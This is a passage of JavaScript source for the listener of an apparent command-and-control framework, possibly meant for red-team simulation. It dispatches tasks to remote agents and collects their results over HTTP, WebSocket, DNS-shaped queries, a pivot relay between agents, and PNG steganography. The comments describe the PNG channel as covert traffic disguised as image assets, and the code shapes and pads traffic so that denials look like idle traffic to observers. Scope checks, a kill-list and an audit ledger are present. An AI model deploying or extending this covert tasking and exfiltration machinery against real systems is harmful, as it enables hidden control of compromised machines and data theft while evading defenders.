  // Deliver queued tasks as frames, in order. deliveredAt = WRITTEN-TO-SOCKET, not
  // agent-acked - ws has no app-level ack (honest ledger semantics). A dead socket
  // leaves the task QUEUED for the next connect (nothing is silently consumed).
  _wsFlush(a) {
    while (a.tasks.length) {
      const t = a.tasks[0];
      const sess = a._ws;
      if (!sess || !sess.open) return;
      const reply = { taskId: t.taskId, kind: t.kind, data: t.data };
      // Channel-assigned transport switch rides the task frame exactly like the dns
      // wires' setTransport key; the assigned->active flip still happens ONLY on an
      // observed inbound ws frame (see _tagTransport) - never on delivery.
      if (a.assignedTransport) reply.setTransport = a.assignedTransport.transport;
      // Envelope layer: enc-proven agents get the task frame CONTENT sealed (the AEAD
      // tag is also the first down-direction authentication this wire has ever had).
      const sealed = a.enc === true && this.encMode !== 'off';
      const sent = sealed
        ? this._wsSendText(sess, sealString(this._encKey(a), JSON.stringify(reply)))
        : this._wsSend(sess, reply);
      if (!sent) { this._wsClose(a, sess, 'write-failed'); return; }
      a.tasks.shift();
      t.deliveredAt = Date.now();
      this._emit('task.delivered', { agentId: a.agentId, taskId: t.taskId, kind: t.kind, transport: 'ws' });
    }
  }

  // Teardown: clear da._ws (only if it still IS this session - a reconnect may have
  // replaced us), unregister, destroy. Never throws into the channel.
  _wsClose(da, sess, reason) {
    if (da && da._ws === sess) da._ws = null;
    this._wsSessions.delete(sess);
    if (sess.open) {
      sess.open = false;
      this._emit('agent.ws-close', { agentId: sess.agentId, reason });
    }
    try { sess.socket.destroy(); } catch {}
  }

  _handle(req, res) {
    this._fpObserve(req);
    const remoteIp = req.socket.remoteAddress || '';
    if (!ipAllowed(remoteIp, this.scope.cidrs)) return this._reject(res, 'out-of-scope-ip', { remoteIp });

    const u = new URL(req.url, 'http://x');

    // Alternate transport: DNS-codec check-ins (same governance as /c, shaped like a
    // domain query). Pull payload = encodeQuery({ a, s, h: hmac(id:s:pull) }).
    // Reply = encoded task JSON or an EMPTY body (the codec's uniform idle/deny case).
    // Push payload = encodeQuery({ a, s, h, t: taskId, k: 'push', i, n, d }) — chunked
    // result bodies, per-chunk HMAC (replay/injection-proof), reassembled into _intakeResult.
    // Routed BEFORE the header-based guards — the codec carries identity in the query.
    if (req.method === 'GET' && u.pathname.startsWith('/d/')) {
      const reply = (buf) => { res.writeHead(200, { 'content-type': 'text/plain', connection: 'close' }); res.end(buf || ''); };
      const p = decodeQuery(decodeURIComponent(u.pathname.slice(3)), { domain: this.dnsDomain || 'ax.sim' });
      return reply(this._dnsPayload(p, remoteIp));
    }

    // STEGANOGRAPHY CHANNEL (roadmap #4, transport 'stg' — engine/stegocodec): the
    // last-resort covert wire. Task/result envelopes ride INSIDE innocuous PNG images
    // fetched over ordinary HTTP from THIS listener — the covertness is that the content
    // IS the channel: to a watcher each check-in is an image asset, not an API call.
    // LOW BANDWIDTH, HIGH LATENCY — a fallback wire, never a primary. HONEST LIMITS:
    // image byte size correlates with payload length (no size padding — documented
    // side-channel), and the agent's poll cadence/timing is fully visible; this wire
    // claims CONTENT cover only, never traffic-analysis immunity.
    //   Pull: GET /stg/i/<asset>.png?d=<base64url envelope {a,s,h}> — the governed pull
    //     payload rides the query exactly like the /d codec; the reply is a 200 image/png
    //     with the intake's reply string (b32 task JSON) LSB-embedded. Idle AND denied
    //     (unknown/killed/bad-auth/stale-seq) both serve the EMPTY-envelope image — the
    //     same 204-uniform doctrine, expressed as an image: structurally identical,
    //     differing only in size. A bare GET (no d — a browser/observer) gets the same
    //     clean empty-envelope image, so the asset story holds for anyone who looks.
    //   Push: POST /stg/u (content-type image/png) — the upload-shaped intake: the
    //     agent's up-envelope (the same chunked push object the ws wire posts) is
    //     LSB-embedded in a PNG the agent "uploads". Decoded and fed verbatim into the
    //     SHARED governed intake (_dnsPayload): per-agent HMAC, strict seq, kill-list,
    //     chunk reassembly all apply unchanged. EVERY answer is 204-empty — accept and
    //     deny are indistinguishable on the wire; the ledger is the loud place.
    //   Oversized down-envelope (a task whose reply string exceeds the frame capacity):
    //     the intake has already dequeued it, so the gap is LOUD in the audit
    //     ('stg.down-failed') and the agent gets the empty image — the exact honesty
    //     window ghc.down-failed documents for the dead-drop wire.
    if (this.stg && req.method === 'GET' && u.pathname.startsWith('/stg/i/')) {
      const asset = decodeURIComponent(u.pathname.slice('/stg/i/'.length));
      if (!/^[a-z0-9][a-z0-9-]{0,63}\.png$/.test(asset)) return this._reject(res, 'malformed', { remoteIp });
      let p = null;
      const d = u.searchParams.get('d');
      if (d) { try { p = JSON.parse(Buffer.from(String(d), 'base64url').toString('utf8')); } catch { p = null; } }
      // A bare GET (no envelope — a browser/observer fetching the asset) is pure cover
      // traffic, NOT a governed event: it never touches the intake and leaves no ledger
      // noise. Only envelope-carrying requests are check-in attempts (audited either way).
      const replyStr = d ? this._dnsPayload(p, remoteIp, 'stg') : '';
      let png;
      try {
        png = encodeStgPng(Buffer.from(replyStr || '', 'utf8'), this.stg);
      } catch (e) {
        if (!e || e.code !== 'CAPACITY') throw e;
        this._stg.downFailed++;
        this._emit('stg.down-failed', { reason: 'capacity', bytes: (replyStr || '').length, capacity: stgCapacity(this.stg), remoteIp });
        png = encodeStgPng(Buffer.alloc(0), this.stg); // the uniform empty-envelope image
      }
      this._stg.served++;
      res.writeHead(200, { 'content-type': 'image/png', 'content-length': png.length, 'cache-control': 'no-store', connection: 'close' });
      res.end(png);
      return;
    }
    if (this.stg && req.method === 'POST' && u.pathname === '/stg/u') {
      const ct = String(req.headers['content-type'] || '').split(';')[0].trim().toLowerCase();
      if (ct !== 'image/png') { this._stg.rejected++; return this._reject(res, 'malformed', { remoteIp }); }
      const chunks = [];
      let size = 0, tooBig = false;
      req.on('data', (d2) => {
        size += d2.length;
        if (size > MAX_BODY) { tooBig = true; req.destroy(); return; }
        chunks.push(d2);
      });
      req.on('end', () => {
        if (tooBig) { this._stg.rejected++; return this._reject(res, 'oversized-body', { remoteIp }); }
        let p = null, decodeErr = null;
        try { p = JSON.parse(decodeStgPng(Buffer.concat(chunks)).toString('utf8')); } catch (e) { decodeErr = e; }
        if (!p || typeof p !== 'object') {
          this._stg.rejected++;
          // The typed stego/JSON failure is loud in the ledger (its code included);
          // the wire answer stays the uniform 204.
          return this._reject(res, 'stg-bad-image', { remoteIp, error: (decodeErr && (decodeErr.code || decodeErr.message)) || 'no-envelope' });
        }
        this._stg.uploads++;
        this._dnsPayload(p, remoteIp, 'stg'); // pushes get no application reply (the /d doctrine)
        res.writeHead(204, { 'content-length': '0', connection: 'close' });
        res.end();
      });
      req.on('error', () => { /* connection died mid-body — nothing to do */ });
      return;
    }

    // Pivot-mesh relay (gap#4b): POST /l — a PARENT agent relays its linked children's
    // governed payloads over its own channel. Body = { link, up: [payloadObj, ...] };
    // reply 200 = { down: [{ a, p }] } (p = the shared intake's reply string, '' for
    // push/idle/deny — byte-identical semantics to a direct wire answer).
    //   · Auth discipline matches /r: HMAC(token, id:seq:'link':sha256(body)).
    //   · Sequence discipline is PER-LINK (not the parent's global check-in seq): relay
    //     traffic must never race or starve the parent's own /c /r cycles. Replay-strict.
    //   · GOVERNANCE: every payload's `a` must be an agent ENROLLED via THIS parent on
    //     THIS link — a parent relaying a foreign child fails the whole batch closed.
    //   · Each payload flows through the SAME governed intake (_dnsPayload, transport
    //     'smb'): child's HMAC + strict seq + kill-list + reassembly, all unchanged.
    //   · Denial is 204-uniform (denial ≡ idle to an observer), the /r doctrine.
    if (req.method === 'POST' && u.pathname === '/l') {
      const parentId = req.headers['x-agent'];
      const linkSeq = Number(req.headers['x-seq']);
      const linkAuth = String(req.headers['x-auth'] || '');
      const parent = this.agents.get(parentId);
      if (!parent) return this._reject(res, 'unknown-agent', { remoteIp });
      if (parent.killed) return this._reject(res, 'killed-agent', { agentId: parentId, remoteIp });
      if (!Number.isInteger(linkSeq) || linkSeq < 1) return this._reject(res, 'stale-seq', { agentId: parentId, seq: linkSeq, remoteIp });
      const chunks = [];
      let size = 0, tooBig = false;
      req.on('data', (d) => {
        size += d.length;
        if (size > MAX_BODY) { tooBig = true; req.destroy(); return; }
        chunks.push(d);
      });
      req.on('end', () => {
        if (tooBig) return this._reject(res, 'oversized-body', { agentId: parentId });
        const body = Buffer.concat(chunks);
        if (linkAuth !== hmac(parent.token, parentId + ':' + linkSeq + ':link:' + sha256(body))) {
          return this._reject(res, 'bad-auth', { agentId: parentId, remoteIp });
        }
        let envelope = null;
        try { envelope = JSON.parse(body.toString('utf8')); } catch { envelope = null; }
        const linkId = envelope && String(envelope.link || '');
        const ups = envelope && Array.isArray(envelope.up) ? envelope.up : null;
        if (!envelope || !validLinkId(linkId) || !ups || !ups.length || ups.length > 64) {
          return this._reject(res, 'link-malformed', { agentId: parentId, remoteIp });
        }
        if (!parent._linkSeqs) parent._linkSeqs = new Map();
        if (linkSeq <= (parent._linkSeqs.get(linkId) || 0)) return this._reject(res, 'stale-seq', { agentId: parentId, seq: linkSeq, remoteIp });
        for (const p of ups) {
          const c = p && typeof p === 'object' ? this.agents.get(p.a) : null;
          if (!c || !c.via || c.via.parent !== parentId || c.via.link !== linkId) {
            this._emit('link.rejected', { reason: 'link-foreign-child', agentId: parentId, link: linkId, child: p && p.a, remoteIp });
            return this._reject(res, 'link-foreign-child', { agentId: parentId, remoteIp });
          }
        }
        parent._linkSeqs.set(linkId, linkSeq);
        parent.lastSeen = Date.now(); parent.remoteIp = remoteIp; // relaying parent is alive
        this._emit('link.relay', { agentId: parentId, link: linkId, ups: ups.length });
        const down = ups.map((p) => ({ a: p.a, p: this._dnsPayload(p, remoteIp, 'smb') }));
        res.writeHead(200, { 'content-type': 'application/json', connection: 'close' });
        res.end(JSON.stringify({ down }));
      });
      req.on('error', () => { /* connection died mid-body — nothing to do */ });
      return;
    }

    const agentId = req.headers['x-agent'];
    const seq = Number(req.headers['x-seq']);
    const auth = String(req.headers['x-auth'] || '');
    const a = this.agents.get(agentId);
    if (!a) return this._reject(res, 'unknown-agent', { remoteIp });
    if (a.killed) return this._reject(res, 'killed-agent', { agentId, remoteIp });
    if (!Number.isInteger(seq) || seq <= a.seq) return this._reject(res, 'stale-seq', { agentId, seq, remoteIp });

    const respond200 = (bodyBuf) => {
      res.writeHead(200, { 'content-type': 'application/octet-stream', 'content-length': bodyBuf.length, connection: 'close' });
      res.end(bodyBuf);
    };
    // Malleable C2: when the operator set a profile, deliver it on every check-in so the
    // agent adopts live (compact JSON — name + numbers, never prose).
    const profileHeaders = () => (a.profile ? { 'x-varvel-profile': JSON.stringify({ label: a.profile.label, intervalMs: a.profile.intervalMs, jitterMs: a.profile.jitterMs, burst: a.profile.burst }) } : {});
    // Channel-assigned transport (gap#5) rides every /c reply exactly like the profile
    // header: compact machine-only config, applied by the agent on its NEXT cycle when
    // locally workable, ignored otherwise.
    const transportHeaders = () => (a.assignedTransport ? { 'x-varvel-transport': a.assignedTransport.transport } : {});
    // Shaping pack v2: the applied wire shape rides every reply as compact machine-only
    // JSON (paths/header templates/cadence/batch/padding + the shapeAt anchor the batch
    // schedule derives from). Absent shape = no header = today's byte-identical wire.
    const shapeHeaders = () => (a.shape ? { 'x-varvel-shape': JSON.stringify({ name: a.shape.name, cadence: a.shape.cadence, batch: a.shape.batch, padding: a.shape.padding, http: a.shape.http, at: a.shapeAt }) } : (a.shapeCleared ? { 'x-varvel-shape': JSON.stringify({ name: 'plain' }) } : {}));
    // Shaped routes (v2): an agent with an applied shape checks in on the profile's
    // path templates instead of the bare /c /r — the channel recognizes its own
    // templates (per-agent, so a shaped path from an unshaped agent is just 'malformed').
    // clearedShapeHttp: the PREVIOUS shape's routes stay answerable so an in-flight
    // poll on a stale path still receives its config headers (shape transitions and the
    // plain-clear would otherwise never reach an agent mid-poll on an old path).
    const shapeHttp = a.shape && a.shape.http ? a.shape.http : null;
    const prevHttp = a.clearedShapeHttp || null;
    const isPullPath = req.method === 'GET' && (u.pathname === '/c' || !!(shapeHttp && shapeHttp.pullPaths.includes(u.pathname)) || !!(prevHttp && prevHttp.pullPaths.includes(u.pathname)));
    const isPushPath = req.method === 'POST' && (u.pathname === '/r' || !!(shapeHttp && shapeHttp.pushPaths.includes(u.pathname)) || !!(prevHttp && prevHttp.pushPaths.includes(u.pathname)));

    if (isPullPath) {      // check-in: auth = HMAC(token, id:seq:pull) — or ':pad' for a padding dummy
      const pullH = hmac(a.token, agentId + ':' + seq + ':pull');
      const padH = hmac(a.token, agentId + ':' + seq + ':pad');
      if (auth !== pullH && auth !== padH) return this._reject(res, 'bad-auth', { agentId, remoteIp });
      // Envelope layer: capability header x-varvel-enc: 1 (post-auth, like the codec
      // wires' ec:1 flag). required mode refuses a capability-less pull loudly.
      const ecOk = String(req.headers['x-varvel-enc'] || '') === '1';
      if (this.encMode === 'required' && !ecOk) return this._reject(res, 'enc-required', { agentId, remoteIp });
      // TLS-inspection self-report (lose-point #5): the agent's own channel-handshake
      // verdict rides as additive check-in metadata (x-varvel-tlsi). Agent-REPORTED —
      // the listener cannot verify the agent's egress path, so this is stored and
      // surfaced as the agent's OBSERVATION, never as proof. Garbage is ignored
      // (normalizeTlsVerdict -> null); older agents simply never send it.
      const tlsiV = normalizeTlsVerdict(req.headers['x-varvel-tlsi']);
      if (tlsiV) a.tlsi = { verdict: tlsiV, at: Date.now(), transport: 'http' };
      const isPad = auth === padH && auth !== pullH;
      a.seq = seq; a.checkins++; a.lastSeen = Date.now(); a.remoteIp = remoteIp;
      if (ecOk) this._encRatchet(a, 'capability', 'http');
      this._tagTransport(a, 'http');
      if (isPad) {
        // PADDING DUMMY (constant-rate shaping, profile-gated): a real authenticated
        // envelope that carries NO task semantics and is AUDITED AS ITSELF ('agent.pad',
        // padding:true) — shaping never hides traffic from the platform's own ledger,
        // and the flow ring counts it (the wire sees it; our self-measurement must too).
        this._emit('agent.pad', { agentId, seq, remoteIp, transport: 'http', padding: true });
        res.writeHead(204, { 'content-length': '0', connection: 'close', ...profileHeaders(), ...transportHeaders(), ...shapeHeaders() });
        res.end();
        return;
      }
      this._emit('agent.checkin', { agentId, seq, remoteIp, transport: 'http' });
      // Batch/dwell windows: held tasks flush as ONE burst once the window's seeded
      // flush point has passed; no batch = the legacy single-task pull (cap 1).
      const batchCap = a.shape && a.shape.batch ? 16 : 1;
      const ready = this._drainDeliverable(a, Date.now(), batchCap);
      if (!ready.length) { res.writeHead(204, { 'content-length': '0', connection: 'close', ...profileHeaders(), ...transportHeaders(), ...shapeHeaders() }); res.end(); return; }
      for (const t of ready) this._emit('task.delivered', { agentId, taskId: t.taskId, kind: t.kind, batched: ready.length > 1 });
      res.writeHead(200, { 'content-type': 'application/octet-stream', connection: 'close', ...profileHeaders(), ...transportHeaders(), ...shapeHeaders() });
      const payload = ready.length > 1 ? { batch: true, tasks: ready.map((t) => ({ taskId: t.taskId, kind: t.kind, data: t.data })) } : { taskId: ready[0].taskId, kind: ready[0].kind, data: ready[0].data };
      // Envelope layer: seal the task body for enc-proven agents (the sealed-string
      // form — the agent recognizes the 'enc1:' prefix; idle/204 stays body-less).
      const bodyText = JSON.stringify(payload);
      res.end(Buffer.from(a.enc === true && this.encMode !== 'off' ? sealString(this._encKey(a), bodyText) : bodyText));
      return;
    }

    if (isPushPath) {
      const taskId = String(req.headers['x-task'] || '');
      const chunks = [];
      let size = 0, tooBig = false;
      req.on('data', (d) => {
        size += d.length;
        if (size > MAX_BODY) { tooBig = true; req.destroy(); return; }
        chunks.push(d);
      });
      req.on('end', () => {
        if (tooBig) return this._reject(res, 'oversized-body', { agentId });
        const body = Buffer.concat(chunks);
        // result: auth = HMAC(token, id:seq:taskId:sha256(body)) — binds result to task AND content
        // (encrypt-then-MAC: when the envelope layer seals the result, THIS signature
        // authenticates the ciphertext — the formula is unchanged, the AEAD open below
        // only ever runs on HMAC-valid bytes: no decryption oracle).
        if (auth !== hmac(a.token, agentId + ':' + seq + ':' + taskId + ':' + sha256(body))) return this._reject(res, 'bad-auth', { agentId, remoteIp });
        // Envelope layer: open the sealed body, or mode-gate the plaintext one.
        const opened = this._openContent(a, body, { remoteIp, transport: 'http', taskId });
        if (!opened.ok) return this._reject(res, opened.reason, { agentId, remoteIp });
        const plain = opened.data;
        a.seq = seq; a.checkins++; a.lastSeen = Date.now(); a.remoteIp = remoteIp;
        this._tagTransport(a, 'http', plain.length); // gap#6: a result push carries real payload bytes
        a.results.push({ taskId, data: plain.toString('utf8'), receivedAt: Date.now() });
        while (a.results.length > MAX_RESULTS) a.results.shift();
        this._intakeResult(a, taskId, plain);
        this._emit('result.received', { agentId, taskId, bytes: plain.length, transport: 'http' });
        respond200(Buffer.alloc(0));
      });
      req.on('error', () => { /* connection died mid-body — nothing to do */ });
      return;
    }

    this._reject(res, 'malformed', { remoteIp });
  }
}
